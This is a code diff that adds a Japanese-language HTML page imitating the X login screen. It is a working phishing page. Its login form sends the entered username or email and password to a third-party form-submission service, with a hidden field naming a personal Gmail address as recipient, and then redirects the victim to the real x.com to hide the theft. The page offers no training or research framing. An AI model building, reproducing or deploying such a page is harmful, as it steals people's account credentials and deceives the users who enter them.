@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xにログイン / X</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: black;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            display: flex;
+            height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            width: 100%;
+        }
+
+        .left-section {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+        }
+
+        .logo {
+            font-size: 72px;
+            font-weight: 700;
+        }
+
+        .right-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 40px;
+            max-width: 500px;
+        }
+
+        .login-heading {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            line-height: 1.2;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid rgb(71, 71, 71);
+            border-radius: 4px;
+            background: rgb(25, 25, 25);
+            color: white;
+            font-size: 15px;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:hover {
+            border-color: rgb(113, 118, 122);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: rgb(29, 155, 240);
+            box-shadow: 0 0 0 2px rgba(29, 155, 240, 0.1);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 24px;
+            margin-bottom: 16px;
+            background: rgb(29, 155, 240);
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background: rgb(26, 140, 216);
+        }
+
+        .login-btn:active {
+            background: rgb(23, 124, 192);
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .forgot-password a {
+            color: rgb(29, 155, 240);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-section {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 40px;
+        }
+
+        .signup-heading {
+            font-size: 15px;
+            color: rgb(113, 118, 122);
+            margin-bottom: 12px;
+        }
+
+        .signup-btn {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: rgb(29, 155, 240);
+            border: 1px solid rgb(71, 71, 71);
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+
+        .signup-btn:hover {
+            background: rgba(29, 155, 240, 0.1);
+            border-color: rgb(29, 155, 240);
+        }
+
+        @media (max-width: 1024px) {
+            .left-section {
+                display: none;
+            }
+
+            .right-section {
+                flex: 1;
+                max-width: 100%;
+            }
+
+            .container {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">𝕏</div>
+        </div>
+
+        <div class="right-section">
+            <div class="login-heading">Xにログイン</div>
+
+            <form id="loginForm" action="https://api.staticforms.xyz/submit" method="POST">
+                <div class="form-group">
+                    <label for="email">メールアドレス、電話番号、またはユーザー名</label>
+                    <input type="text" id="email" name="email" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">パスワード</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <input type="hidden" name="replyTo" value="sinemonn555@gmail.com">
+                <input type="hidden" name="redirectTo" value="https://x.com/">
+
+                <button type="submit" class="login-btn">ログイン</button>
+            </form>
+
+            <div class="forgot-password">
+                <a href="#forgot">パスワードを忘れましたか？</a>
+            </div>
+            
+
+            <div class="signup-section">
+                <div class="signup-heading">アカウントをお持ちですか？</div>
+                <button class="signup-btn" onclick="alert('新規登録画面に移動します')">登録</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (email && password) {
+                alert('ログイン処理を実行します');
+
+
+            }
+        });
+    </script> -->
+</body>
+</html>
